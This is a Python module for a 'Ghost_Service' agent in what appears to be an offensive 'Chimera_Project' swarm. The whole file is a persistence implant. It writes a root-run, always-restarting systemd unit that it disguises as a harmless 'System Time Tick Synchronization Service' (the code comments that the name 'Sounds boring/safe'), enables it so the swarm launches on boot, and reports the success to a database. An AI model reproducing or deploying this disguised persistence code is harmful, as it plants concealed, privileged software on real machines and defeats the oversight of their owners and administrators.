import sys; sys.path.append('/home/dan/Chimera_Project')
import os
import sys
import subprocess
import logging

# GPS Line
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../../../')))
from core.db_handler import ChimeraDB

class Ghost_Service:
    def __init__(self):
        self.agent_id = "80"
        self.name = "Ghost_Service"
        self.db = ChimeraDB()
        self.service_name = "sys-timetick.service" # Sounds boring/safe
        self.service_path = f"/etc/systemd/system/{self.service_name}"

    def install_persistence(self):
        """Creates a systemd service to launch the swarm on boot."""
        # Note: Requires root/sudo
        service_content = f"""[Unit]
Description=System Time Tick Synchronization Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /home/dan/Chimera_Project/ignite.sh
Restart=always

[Install]
WantedBy=multi-user.target
"""
        try:
            with open(self.service_path, "w") as f:
                f.write(service_content)
            
            subprocess.run(["systemctl", "daemon-reload"], check=True)
            subprocess.run(["systemctl", "enable", self.service_name], check=True)
            self.logger.warning(f"[!] Persistence established via {self.service_name}")
            
            self.db.report_finding(self.name, "Persistence_Established", {"method": "systemd"})
        except Exception as e:
            self.logger.error(f"Failed to install service: {e}. Are you root?")

    def run(self):
        log_path = f"/home/dan/Chimera_Project/logs/{self.name}.log"
        logging.basicConfig(filename=log_path, level=logging.INFO)
        self.logger = logging.getLogger(self.name)
        
        self.db.heartbeat(self.name)
        self.install_persistence()
        self.db.close()

if __name__ == "__main__":
    agent = Ghost_Service()
    agent.run()
